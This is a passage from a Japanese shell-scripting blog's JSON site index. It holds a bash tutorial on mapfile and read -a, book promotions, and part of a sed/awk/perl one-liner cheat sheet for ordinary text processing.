Two Three 添字の0を表示 One 添字の1を表示 Two 添字の2を表示 Three bash-3.2$ 普通のやり方 fileコマンドパターン ファイルの読み込みを以下のようにすることもできますね。\n#!/usr/bin/bash DATAFILE=\u0026#34;data.txt\u0026#34;; # データファイル declare -a aLine; # 配列の宣言 declare -i COUNT=0; # カウンターの宣言 IFS=$\u0026#39;\\n\u0026#39;; # 区切り文字を改行コードに指定 # ファイルを配列に読み込む file=(`cat \u0026#34;$DATAFILE\u0026#34;`) # 行ごとに繰り返し処理を実行 for line in \u0026#34;${file[@]}\u0026#34;; do # １行ずつ読み込んだ内容 $line を配列に代入 aLine[$COUNT]=\u0026#34;$line\u0026#34;; ((COUNT++)); # インクリメント done echo \u0026#34;配列の内容すべてを表示\u0026#34; echo ${aLine[@]}; # One Two Three echo \u0026#34;添字の0を表示\u0026#34; echo ${aLine[0]}; # One echo \u0026#34;添字の1を表示\u0026#34; echo ${aLine[1]}; # Two echo \u0026#34;添字の2を表示\u0026#34; echo ${aLine[2]}; # Three 実行結果は以下のとおりです。\nbash-3.2$ bash array02.sh 配列の内容すべてを表示 One Two Three 添字の0を表示 One 添字の1を表示 Two 添字の2を表示 Three bash-3.2$ 登場！ mapfile を使う なんと、ファイル読み込みや配列への代入にあれこれやっていましたが、mapfileを使うと１行で住みます。\nCOUNT変数といったカウンターや IFSといった定義も不要です。\nOne Two Three Four Five Six Seven Eight Nine Ten #!/usr/bin/bash DATAFILE=\u0026#34;data.txt\u0026#34;; # データファイル declare -a aLine; # 配列の宣言 # -t は行末の改行を除去 mapfile -t aLine \u0026lt; \u0026#34;$DATAFILE\u0026#34;; echo \u0026#34;配列の内容すべてを表示\u0026#34; echo ${aLine[@]}; # One Two Three echo \u0026#34;添字の0を表示\u0026#34; echo ${aLine[0]}; # One echo \u0026#34;添字の1を表示\u0026#34; echo ${aLine[1]}; # Two echo \u0026#34;添字の2を表示\u0026#34; echo ${aLine[2]}; # Three 実行結果はいずれも同じですが以下のとおりです。\nbash-3.2$ bash array03.sh 配列の内容すべてを表示 One Two Three 添字の0を表示 One 添字の1を表示 Two 添字の2を表示 Three bash-3.2$ すごいですね。\n配列に入れるだけならmapfileで十分です。しかも読み込み専用ということもあり、読み込み速度は通常の数十倍高速です。\n列の代入 ここで余談ですが、これまでは行の読み込みを行い、行を単位に配列に格納してきました。\n列の中で空白区切りで値が入っている場合の配列への代入はどうしましょう？\nこうなります。\n#!/usr/bin/bash # １行に３つの値が空白区切りで並んでいます read -a aLine \u0026lt;\u0026lt;\u0026lt; \u0026#34;One Two Three\u0026#34; echo \u0026#34;配列の内容すべてを表示\u0026#34; echo ${aLine[@]}; # One Two Three echo \u0026#34;添字の0を表示\u0026#34; echo ${aLine[0]}; # One echo \u0026#34;添字の1を表示\u0026#34; echo ${aLine[1]}; # Two echo \u0026#34;添字の2を表示\u0026#34; echo ${aLine[2]}; # Three 実行結果は以下のとおりです。\nbash-3.2$ bash col.sh 配列の内容すべてを表示 One Two Three 添字の0を表示 One 添字の1を表示 Two 添字の2を表示 Three bash-3.2$ データファイルからの入力 では、データファイルの構造を少し複雑にしてみます。\nOne Two Three Four Five Six Seven Eight Nine Ten mapfileコマンドで行の内容を配列に入れる方法は説明しましたが、今回は、行の中で空白区切りの値が３つあります。\nこうしたデータ構造をmapfileに加えてreadコマンドを使って効率的に、かつ高速に読み込んでみます。\n#!/usr/bin/bash DATAFILE=\u0026#34;data02.txt\u0026#34;; declare -a aLine; # データファイルを読み込みます。 mapfile -t aLine\u0026lt;\u0026#34;$DATAFILE\u0026#34;; for((i=0;i\u0026lt;4;i++));do # 行の内容を読み込み、空白区切りで配列に格納します read -a var \u0026lt;\u0026lt;\u0026lt; \u0026#34;${aLine[$i]}\u0026#34;; echo \u0026#34;varの中身は以下の通り\u0026#34;; echo \u0026#34;${var[@]}\u0026#34;; echo \u0026#34;添字の0を表示\u0026#34; echo ${var[0]}; # One echo \u0026#34;添字の1を表示\u0026#34; echo ${var[1]}; # Two echo \u0026#34;添字の2を表示\u0026#34; echo ${var[2]}; # Three done 実行結果は以下のとおりです。\nbash-3.2$ bash colArray.sh varの中身は以下の通り One Two Three 添字の0を表示 One 添字の1を表示 Two 添字の2を表示 Three varの中身は以下の通り Four Five Six 添字の0を表示 Four 添字の1を表示 Five 添字の2を表示 Six varの中身は以下の通り Seven Eight Nine 添字の0を表示 Seven 添字の1を表示 Eight 添字の2を表示 Nine varの中身は以下の通り Ten 添字の0を表示 Ten 添字の1を表示 添字の2を表示 bash-3.2$ 最後の行は値が一つしかありません（Ten）\n必要であれば値がない場合は出力しないなどの処理をすれば良さそうです。\n（配列的には別に値がなくても問題はないと思いますが）\nmapfileとreadコマンドを上手に使って、効率的に配列に代入してください。\n書籍の紹介 UNIXという考え方—その設計思想と哲学 単行本 2001/2/23 UNIX系のOSは世界で広く使われている。UNIX、Linux、FreeBSD、Solarisなど、商用、非商用を問わず最も普及したOSのひとつであろう。そしてこのOSは30年にわたって使用され続けているものでもある。なぜこれほど長い間使われてきたのか？ その秘密はUNIXに込められた数々の哲学や思想が握っている。 そもそもUNIXはMulticsという巨大なOSの開発から生まれたものだ。あまりに巨大なMulticsはその複雑さゆえに開発は遅々として進まず、その反省からケン・トンプソンが作ったのがUNIXの初めとされる。その後デニス・リッチーら多数の開発者が携わり、UNIXは発展した。本書はこのUNIXに込められた「思想と哲学」を抽出し、数々のエピソードとともにUNIXの特徴を浮き彫りにしていく。 たとえば本書で述べられているUNIXの発想のひとつとして「過度の対話式インタフェースを避ける」というものがある。UNIXのシステムは初心者には「不親切」なつくり、つまり親切な対話式のインタフェースはほとんどなく、ユーザーがコマンドを実行しようとするときはオプションをつける形をとっている。この形式はオプションをいちいち覚えねばならず、初心者に決してやさしくない。しかしこれはプログラムを小さく単純なものにし、他のプログラムとの結合性を高くする。そして結果としてUNIXのスケーラビリティと移植性の高さを支えることになっているのだ。このような形式で本書では9つの定理と10の小定理を掲げ、UNIXが何を重視し、何を犠牲にしてきたのかを明快に解説している。\n最終章にはMS-DOSなどほかのOSの思想も紹介されている。UNIXの思想が他のOSとどう違うかをはっきり知ることになるだろう。UNIXの本質を理解するうえで、UNIX信者もUNIX初心者にとっても有用な1冊だ。（斎藤牧人）\nAmazonで詳細を見る\nAmazon.co.jpアソシエイトを使用\n詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2023-01-12T16:00:05+09:00","image":"https://suzukiiichiro.github.io/posts/2023-01-12-01-mapfile-suzuki/bash_hu5909208fb16d2109d0cdca2186f9358e_33901_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2023-01-12-01-mapfile-suzuki/","title":"【mapfile】bash/シェルスクリプトマニアックコマンドあれこれ１３"},{"content":"ワンライナー ワンライナー（英：one liner）とは\n華麗な職人技によって処理を1行に全部詰め込んだ「1行ですべてが完結しているプログラムソース」のこと。\n一説にはプログラムソースの文字数が６５文字以下である事が必要といわれている。\n【ちょいと便利な】シェルスクリプトワンライナー特集【一行完結】\nhttps://suzukiiichiro.github.io/posts/2022-11-30-01-oneliner-suzuki/\n【ちょいと便利な】シェルスクリプトワンライナー特集２【一行完結】\nhttps://suzukiiichiro.github.io/posts/2023-01-11-01-oneliner-suzuki/\nコマンドにおける一般的な２つの実行方法 次のコマンドのほとんどは、\n１．パイプ経由で使用すること\n２．ファイルに対して直接使用する\nのいずれも可能です。\nたとえば、コマンド sed expressionは次の両方の方法で使用できます。\n... | sed expression sed expression path/to/file ファイル間隔 ダブルスペースの扱いについて\nsed G awk \u0026#39;1;{print \u0026#34;\u0026#34;}\u0026#39; awk \u0026#39;BEGIN{ORS=\u0026#34;\\n\\n\u0026#34;};1\u0026#39; 既に空白行が含まれているダブルスペース。\n出力では、テキストの行間に空白行を1行以上含めません。\nsed \u0026#39;/^$/d;G\u0026#39; awk \u0026#39;NF{print $0 \u0026#34;\\n\u0026#34;}\u0026#39; トリプルスペースの扱いについて\nsed \u0026#39;G;G\u0026#39; awk \u0026#39;1;{print \u0026#34;\\n\u0026#34;}\u0026#39; ダブルスペースを元に戻します (偶数行は常に空白であると仮定します):\nsed \u0026#39;n;d\u0026#39; 一致するすべての行の上に空白行を挿入します。\nsed \u0026#39;/regex/{x;p;x;}\u0026#39; regexに一致するすべての行の下に空白行を挿入します。\nsed \u0026#39;/regex/G\u0026#39; 正規表現に一致するすべての行の上下に空白行を挿入します。\nsed \u0026#39;/regex/{x;p;x;G;}\u0026#39; 末尾に改行を追加します:\nsed \u0026#39;$a \\\\\u0026#39; 番号付けと計算 タブを使用して各行に番号を付けます (単純な左揃え)。\nsed = filename | sed \u0026#39;N;s/\\n/\\t/\u0026#39; awk \u0026#39;{print FNR \u0026#34;\\t\u0026#34; $0}\u0026#39; タブを使用して各行の前に行番号を付けます。\nawk \u0026#39;{print NR \u0026#34;\\t\u0026#34; $0}\u0026#39; files* 行番号を付ける (左揃え、右揃えの番号)。\nnl sed = filename | sed \u0026#39;N; s/^/ /; s/ *\\(.\\{6,\\}\\)\\n/\\1 /\u0026#39; awk \u0026#39;{printf(\u0026#34;%5d : %s\\n\u0026#34;, NR,$0)}\u0026#39; 行が空白でない場合にのみ行番号を付ける。\nsed \u0026#39;/./=\u0026#39; filename | sed \u0026#39;/./N; s/\\n/ /\u0026#39; awk \u0026#39;NF{$0=++a \u0026#34; :\u0026#34; $0};1\u0026#39; awk \u0026#39;{print (NF? ++a \u0026#34; :\u0026#34; :\u0026#34;\u0026#34;) $0}\u0026#39; 行を数える:\nwc -l sed -n \u0026#39;$=\u0026#39; awk \u0026#39;END{print NR}\u0026#39; すべての行のすべてのフィールドの合計を出力します。\nawk \u0026#39;{s=0; for (i=1; i\u0026lt;=NF; i++) s=s+$i; print s}\u0026#39; awk \u0026#39;{s=0; for (i=1; i\u0026lt;=NF; i++) s=s+$i}; END{print s}\u0026#39; 各フィールドを絶対値で置き換えた後、すべての行を出力します。\nawk \u0026#39;{for (i=1; i\u0026lt;=NF; i++) if ($i \u0026lt; 0) $i = -$i; print }\u0026#39; awk \u0026#39;{for (i=1; i\u0026lt;=NF; i++) $i = ($i \u0026lt; 0) ? -$i : $i; print }\u0026#39; すべての行のフィールド (「単語」) の総数を出力します。\nawk \u0026#39;{ total = total + NF }; END {print total}\u0026#39; file 「Beth」を含む行数を出力します。\nawk \u0026#39;/Beth/{n++}; END {print n+0}\u0026#39; 最大の最初のフィールドとそれを含む行を出力します (フィールド 1 で最も長い文字列を見つけることを目的としています)。\nawk \u0026#39;$1 \u0026gt; max {max=$1; maxline=$0}; END{ print max, maxline}\u0026#39; 各行のフィールド数を出力し、その後に次の行を出力します。\nawk \u0026#39;{ print NF \u0026#34;:\u0026#34; $0 } \u0026#39; 各行の最後のフィールドを出力します。\nawk \u0026#39;{ print $NF }\u0026#39; 最初のフィールドを除くすべてを出力します。\nawk \u0026#39;{ $1 = \u0026#34;\u0026#34;; print substr($0, 2) }\u0026#39; 最後の行の最後のフィールドを出力します。\nawk \u0026#39;{ field = $NF }; END{ print field }\u0026#39; 4 つ以上のフィールドを含むすべての行を出力します。\nawk \u0026#39;NF \u0026gt; 4\u0026#39; 最後のフィールドの値が \u0026gt; 4 であるすべての行を出力します\nawk \u0026#39;$NF \u0026gt; 4\u0026#39; 各行に最初と最後の列を追加します。\nperl -lane \u0026#39;print $F[0] + $F[-1]\u0026#39; すべての数値を 1 ずつ増やします。\nperl -pe \u0026#39;s/(\\d+)/ 1 + $1 /ge\u0026#39; 列を要約します。\nawk \u0026#39;{ sum+=$1 } END { print sum }\u0026#39; ##変換と置換\n改行をスペースに変換します。\ntr \u0026#39;\\n\u0026#39; \u0026#39; \u0026#39; perl -pe \u0026#39;s/\\n/ /\u0026#39; sed \u0026#39;:a;N;$!ba;s/\\n/ /g\u0026#39; # will not convert last newline! CRLF を LF 形式に変換します。\nsed \u0026#39;s/.$//\u0026#39; # assumes that all lines end with CRLF sed \u0026#39;s/^M$//\u0026#39; # in bash/tcsh, press Ctrl-V then Ctrl-M sed \u0026#39;s/\\x0D$//\u0026#39; # works on ssed, gsed 3.02.80 or higher tr -d \\r # GNU tr version 1.22 or higher awk \u0026#39;{sub(/\\r$/,\u0026#34;\u0026#34;)};1\u0026#39; # assumes EACH line ends with Ctrl-M perl -p -i -e \u0026#39;s/\\012?\\015/\\n/g\u0026#39; 各行の先頭から先頭の空白 (スペース、タブ) を削除し、すべてのテキストを揃えて左揃えにします。\nsed \u0026#39;s/^[ \\t]*//\u0026#39; awk \u0026#39;{sub(/^[ \\t]+/, \u0026#34;\u0026#34;)};1\u0026#39; 各行の終わりから末尾の空白 (スペース、タブ) を削除します。\nsed \u0026#39;s/[ \\t]*$//\u0026#39; awk \u0026#39;{sub(/[ \\t]+$/, \u0026#34;\u0026#34;)};1\u0026#39; 各行から先頭と末尾の両方の空白を削除します。\nsed \u0026#39;s/^[ \\t]*//;s/[ \\t]*$//\u0026#39; awk \u0026#39;{gsub(/^[ \\t]+|[ \\t]+$/,\u0026#34;\u0026#34;)};1\u0026#39; awk \u0026#39;{$1=$1};1\u0026#39; # also removes extra space between fields 各行の先頭に 5 つの空白を挿入します (ページ オフセットを作成します)。\nsed \u0026#39;s/^/ /\u0026#39; awk \u0026#39;{sub(/^/, \u0026#34; \u0026#34;)};1\u0026#39; すべてのテキストを揃えて、79 列の幅で右揃えにします。\nsed -e :a -e \u0026#39;s/^.\\{1,78\\}$/ \u0026amp;/;ta\u0026#39; awk \u0026#39;{printf \u0026#34;%79s\\n\u0026#34;, $0}\u0026#39; すべてのテキストを 79 列幅の中央に配置します。方法 1 では、行頭のスペースが重要であり、後続のスペースは行末に追加されます。方法 2 では、行の先頭にあるスペースは行の中央揃えで破棄され、行末に末尾のスペースは表示されません。\nsed -e :a -e \u0026#39;s/^.\\{1,77\\}$/ \u0026amp; /;ta\u0026#39; # method 1 sed -e :a -e \u0026#39;s/^.\\{1,77\\}$/ \u0026amp;/;ta\u0026#39; -e \u0026#39;s/\\( *\\)\\1/\\1/\u0026#39; # method 2 awk \u0026#39;{l=length();s=int((79-l)/2); printf \u0026#34;%\u0026#34;(s+l)\u0026#34;s\\n\u0026#34;,$0}\u0026#39; 各行で次のように置換 (検索および置換)します。\nsed \u0026#39;s/foo/bar/\u0026#39; # replaces only 1st instance in a line awk \u0026#39;{sub(/foo/,\u0026#34;bar\u0026#34;)}; 1\u0026#39; # replaces only 1st instance in a line sed \u0026#39;s/foo/bar/4\u0026#39; # replaces only 4th instance in a line gawk \u0026#39;{$0=gensub(/foo/,\u0026#34;bar\u0026#34;,4)}; 1\u0026#39; # replaces only 4th instance in a line sed \u0026#39;s/foo/bar/g\u0026#39; # replaces ALL instances in a line awk \u0026#39;{gsub(/foo/,\u0026#34;bar\u0026#34;)}; 1\u0026#39; # replaces ALL instances in a line sed \u0026#39;s/\\(.*\\)foo\\(.*foo\\)/\\1bar\\2/\u0026#39; # replaces the next-to-last case sed \u0026#39;s/\\(.*\\)foo/\\1bar/\u0026#39; # replaces only the last case perl -p -i.bak -e \u0026#39;s/foo/bar/g\u0026#39; *.c # also keeps backups bazを含む行のfooをbarに置き換えます。\nsed \u0026#39;/baz/s/foo/bar/g\u0026#39; awk \u0026#39;/baz/{gsub(/foo/, \u0026#34;bar\u0026#34;)}; 1\u0026#39; bazを除く行のfooをbarに置き換えます。\nsed \u0026#39;/baz/!s/foo/bar/g\u0026#39; awk \u0026#39;!/baz/{gsub(/foo/, \u0026#34;bar\u0026#34;)}; 1\u0026#39; scarletまたはrubyまたはpuceをredに変更します。\nsed \u0026#39;s/scarlet/red/g;s/ruby/red/g;s/puce/red/g\u0026#39; # most seds gsed \u0026#39;s/scarlet\\|ruby\\|puce/red/g\u0026#39; # GNU sed only awk \u0026#39;{gsub(/scarlet|ruby|puce/, \u0026#34;red\u0026#34;)}; 1\u0026#39; 行の逆順:\ntac sed \u0026#39;1!G;h;$!d\u0026#39; sed -n \u0026#39;1!G;h;$p\u0026#39; awk \u0026#39;{a[i++]=$0} END {for (j=i-1; j\u0026gt;=0;) print a[j--] }\u0026#39; perl -e \u0026#39;print reverse \u0026lt;\u0026gt;\u0026#39; 段落を反転します:\nperl -00 -e \u0026#39;print reverse \u0026lt;\u0026gt;\u0026#39; 行の各文字を反転します。\nrev sed \u0026#39;/\\n/!G;s/\\(.\\)\\(.*\\n\\)/\u0026amp;\\2\\1/;//D;s/.//\u0026#39; perl -nle \u0026#39;print scalar reverse $_\u0026#39; 行のペアを並べて結合します。\npaste sed \u0026#39;$!N;s/\\n/ /\u0026#39; 行がバックスラッシュで終わっている場合は、次の行を追加します。\nsed -e :a -e \u0026#39;/\\\\$/N; s/\\\\\\n//; ta\u0026#39; 行が等号で始まる場合は前の行に追加し、「=」を 単一のスペースに置き換えます。\nsed -e :a -e \u0026#39;$!N;s/\\n=/ /;ta\u0026#39; -e \u0026#39;P;D\u0026#39; 数値文字列にコンマを追加し「1234567」を「1,234,567」に変更します。\ngsed \u0026#39;:a;s/\\B[0-9]\\{3\\}\\\u0026gt;/,\u0026amp;/;ta\u0026#39; # GNU sed sed -e :a -e \u0026#39;s/\\(.*[0-9]\\)\\([0-9]\\{3\\}\\)/\\1,\\2/;ta\u0026#39; # other seds 小数点とマイナス記号を含む数値にコンマを追加します。\ngsed -r \u0026#39;:a;s/(^|[^0-9.])([0-9]+)([0-9]{3})/\\1\\2,\\3/g;ta\u0026#39; 5 行ごとに空白行を追加します (5、10、15、20 行などの後):\ngsed \u0026#39;0~5G\u0026#39; # GNU sed only sed \u0026#39;n;n;n;n;G;\u0026#39; # other seds すべてのユーザーのログイン名を出力して並べ替えます。\nawk -F \u0026#34;:\u0026#34; \u0026#39;{print $1 | \u0026#34;sort\u0026#34; }\u0026#39; /etc/passwd 各行の最初の 2 つのフィールドを逆の順序で出力します。\nawk \u0026#39;{print $2, $1}\u0026#39; すべての行の最初の 2 つのフィールドを切り替えます。\nawk \u0026#39;{temp = $1; $1 = $2; $2 = temp}\u0026#39; その行の最初のフィールドを削除して、すべての行を印刷します。\ncut -d\u0026#39; \u0026#39; -f2- awk \u0026#39;{ $1 = \u0026#34;\u0026#34;; print }\u0026#39; その行の 2 番目のフィールドを削除して、すべての行を出力します。\nawk \u0026#39;{ $2 = \u0026#34;\u0026#34;; print }\u0026#39; すべての行のフィールドを逆順に出力します。\nawk \u0026#39;{for (i=NF; i\u0026gt;0; i--) printf(\u0026#34;%s \u0026#34;,$i);print \u0026#34;\u0026#34;}\u0026#39; フィールド間にコンマ区切りを使用して、5 行ごとに入力を連結します。\nawk \u0026#39;ORS=NR%5?\u0026#34;,\u0026#34;:\u0026#34;\\n\u0026#34;\u0026#39; 各ファイル名の文字列の名前の部分aaaをbbbに変更します。\nls | perl -ne \u0026#39;chomp; next unless -e; $o = $_; s/aaa/bbb/; next if -e; rename $o, $_\u0026#39;; 選択出力 最初の 10 行を出力します。\nhead sed 10q awk \u0026#39;NR \u0026lt; 11\u0026#39; 最初の行を印刷:\nhead -1 sed q awk \u0026#39;NR\u0026gt;1{exit};1\u0026#39; 最後の 10 行を出力します。\ntail sed -e :a -e \u0026#39;$q;N;11,$D;ba\u0026#39; 最後の 2 行を出力します。\ntail -2 sed \u0026#39;$!N;$!D\u0026#39; awk \u0026#39;{y=x \u0026#34;\\n\u0026#34; $0; x=$0};END{print y}\u0026#39; 最後の行を出力\ntail -1 sed \u0026#39;$!d\u0026#39; sed -n \u0026#39;$p\u0026#39; awk \u0026#39;END{print}\u0026#39; 最終行の次の行を出力します。\nsed -e \u0026#39;$!{h;d;}\u0026#39; -e x # for 1-line, print blank line sed -e \u0026#39;1{$q;}\u0026#39; -e \u0026#39;$!{h;d;}\u0026#39; -e x # for 1-line, print the line sed -e \u0026#39;1{$d;}\u0026#39; -e \u0026#39;$!{h;d;}\u0026#39; -e x # for 1-line, print nothing 正規表現に一致する行のみを出力します。\ngrep \u0026#39;regex\u0026#39; sed -n \u0026#39;/regex/p\u0026#39; # method 1 sed \u0026#39;/regex/!d\u0026#39; # method 2 awk \u0026#39;/regex/\u0026#39; 正規表現に一致しない行のみを出力:\ngrep -v regex sed -n \u0026#39;/regex/!p\u0026#39; # method 1, corresponds to above sed \u0026#39;/regex/d\u0026#39; # method 2, simpler syntax awk \u0026#39;!/regex/\u0026#39; 正規表現の直前の行を出力しますが、正規表現を含む行は出力しません:\nsed -n \u0026#39;/regex/{g;1!p;};h\u0026#39; awk \u0026#39;/regex/{print x};{x=$0}\u0026#39; awk \u0026#39;/regex/{print (NR==1 ? \u0026#34;match on line 1\u0026#34; : x)};{x=$0}\u0026#39; 正規表現の直後の行を出力しますが、それを含む行は出力しません:\nsed -n \u0026#39;/regex/{n;p;}\u0026#39; awk \u0026#39;/regex/{getline;print}\u0026#39; 正規表現の前後に 1 行のコンテキストを行番号付きで出力します。\ngrep -A1 -B1 -n regex sed -n -e \u0026#39;/regex/{=;x;1!p;g;$!N;p;D;}\u0026#39; -e h AAA と BBB と CCC を検索します (任意の順序で):\nsed \u0026#39;/AAA/!d; /BBB/!d; /CCC/!d\u0026#39; awk \u0026#39;/AAA/ \u0026amp;\u0026amp; /BBB/ \u0026amp;\u0026amp; /CCC/\u0026#39; AAA、BBB、CCC(この順序で)を含む行を検索します。\nsed \u0026#39;/AAA.*BBB.*CCC/!d\u0026#39; awk \u0026#39;/AAA.*BBB.*CCC/\u0026#39; AAA、BBBまたはCCCを検索します。\negrep \u0026#34;AAA|BBB|CCC\u0026#34; grep -E \u0026#34;AAA|BBB|CCC\u0026#34; sed -e \u0026#39;/AAA/b\u0026#39; -e \u0026#39;/BBB/b\u0026#39; -e \u0026#39;/CCC/b\u0026#39; -e d # most seds gsed \u0026#39;/AAA\\|BBB\\|CCC/!d\u0026#39; # GNU sed only AAAが含まれている段落を出力します(空白行で段落を区切ります):\nsed -e \u0026#39;/./{H;$!d;}\u0026#39; -e \u0026#39;x;/AAA/!d;\u0026#39; 段落AAAに BBBとCCC(任意の順序で)が含まれている段落を出力します。\nsed -e \u0026#39;/./{H;$!d;}\u0026#39; -e \u0026#39;x;/AAA/!d;/BBB/!d;/CCC/!d\u0026#39; AAA、BBBまたはCCCが含まれている段落を出力します。\nsed -e \u0026#39;/./{H;$!d;}\u0026#39; -e \u0026#39;x;/AAA/b\u0026#39; -e \u0026#39;/BBB/b\u0026#39; -e \u0026#39;/CCC/b\u0026#39; -e d gsed \u0026#39;/./{H;$!d;};x;/AAA\\|BBB\\|CCC/b;d\u0026#39; # GNU sed only 65 文字以上の行を出力します。\nsed -n \u0026#39;/^.\\{65\\}/p\u0026#39; awk \u0026#39;length \u0026gt; 64\u0026#39; 65 文字未満の行のみを出力します。\nsed -n \u0026#39;/^.\\{65\\}/!p\u0026#39; # method 1, corresponds to above sed \u0026#39;/^.\\{65\\}/d\u0026#39; # method 2, simpler syntax awk \u0026#39;length \u0026lt; 65\u0026#39; 正規表現から最後までのセクションを出力します。\nsed -n \u0026#39;/regex/,$p\u0026#39; awk \u0026#39;/regex/,0\u0026#39; awk \u0026#39;/regex/,EOF\u0026#39; 行番号に基づいてセクションを出力します (8 行目から 12 行目まで):\nsed -n \u0026#39;8,12p\u0026#39; sed \u0026#39;8,12!d\u0026#39; awk \u0026#39;NR==8,NR==12\u0026#39; perl -ne \u0026#39;print if 8 .. 12\u0026#39; perl -pe \u0026#39;exit if 8\u0026lt;$. \u0026amp;\u0026amp; $.\u0026lt;12\u0026#39; 行番号 52 を出力します。\nsed -n \u0026#39;52p\u0026#39; sed \u0026#39;52!d\u0026#39; sed \u0026#39;52q;d\u0026#39; # efficient on large files awk \u0026#39;NR==52\u0026#39; awk \u0026#39;NR==52 {print;exit}\u0026#39; # more efficient on large files 3 行目から 7 行ごとに出力します。\ngsed -n \u0026#39;3~7p\u0026#39; sed -n \u0026#39;3,${p;n;n;n;n;n;n;}\u0026#39; 2 つの正規表現の間のセクションを出力します (包括的):\nsed -n \u0026#39;/START/,/END/p\u0026#39; awk \u0026#39;/START/,/END/\u0026#39; perl -ne \u0026#39;print if /START/ .. /END/\u0026#39; perl -ne \u0026#39;print if m{START} .. m{END}\u0026#39; 2 つの正規表現の間のセクションを除くすべてを出力します。\nsed \u0026#39;/START/,/END/d\u0026#39; perl -i.old -ne \u0026#39;print unless /START/ .. /END/\u0026#39; フィールドを正規表現と照合します。\nawk \u0026#39;$7 ~ /^[a-f]/\u0026#39; # print line if field #7 matches regex awk \u0026#39;$7 !~ /^[a-f]/\u0026#39; # print line if field #7 does NOT match regex フィールド 5 が に等しい任意の行を出力しますabc123。\nawk \u0026#39;$5 == \u0026#34;abc123\u0026#34;\u0026#39; フィールド 5 が等しくない行のみを出力しabc123ます (フィールドが 5 未満の行も出力します)。\nawk \u0026#39;$5 != \u0026#34;abc123\u0026#34;\u0026#39; awk \u0026#39;!($5 == \u0026#34;abc123\u0026#34;)\u0026#39; 回文を出力します。\nperl -lne \u0026#39;print if $_ eq reverse\u0026#39; 重複した単語を一行に出力する：\nperl -0777 -ne \u0026#39;print \u0026#34;$.: doubled $_\\n\u0026#34; while /\\b(\\w+)\\b\\s+\\b\\1\\b/gi\u0026#39; パターンからの抜粋:\nawk \u0026#39;match($0, /(.+)/, a) { print a[1] }\u0026#39; grep -oP \u0026#34;queue name=\u0026#39;\\K.+?(?=\u0026#39;)\u0026#34; コンテキストでフィルタリングし、コンテキストからフィールドを出力します。\ngrep -A1 \u0026#39;to filter\u0026#39; /etc/multipath.conf | awk \u0026#39;BEGIN { RS=\u0026#34;--\u0026#34; } ; { print $2, $4 }\u0026#39; クリップボードから出力します。\nawk \u0026#39;match($0, /h_vmem=([0-9]+[kKmMgGtT])/, a) { print a[1] }\u0026#39; 選択的削除 重複する連続した行を削除します。\n一連の重複行の最初の行は保持され、残りは削除されます。\nuniq sed \u0026#39;$!N; /^\\(.*\\)\\n\\1$/!P; D\u0026#39; awk \u0026#39;a !~ $0; {a=$0}\u0026#39; 重複が連続していない行を削除します。\nsed -n \u0026#39;G; s/\\n/\u0026amp;\u0026amp;/; /^\\([ -~]*\\n\\).*\\n\\1/d; s/\\n//; h; P\u0026#39; awk \u0026#39;!a[$0]++\u0026#39; # most concise script awk \u0026#39;!($0 in a){a[$0];print}\u0026#39; # most efficient script 重複する行を除くすべての行を削除します。\nuniq -d sed \u0026#39;$!N; s/^\\(.*\\)\\n\\1$/\\1/; t; D\u0026#39; 最初の行を削除します。\ntail -n +2 awk \u0026#39;NR \u0026gt; 1\u0026#39; 最初の 10 行を削除します。\nsed \u0026#39;1,10d\u0026#39; awk \u0026#39;NR \u0026gt; 10\u0026#39; perl -ne \u0026#39;print unless 1 .. 10\u0026#39; 5 行目を削除します。\nawk \u0026#39;NR != 5\u0026#39; sed \u0026#39;5d\u0026#39; 5 ～ 10 などの範囲の行を削除します。\nawk \u0026#39;NR \u0026lt; 5 || NR \u0026gt; 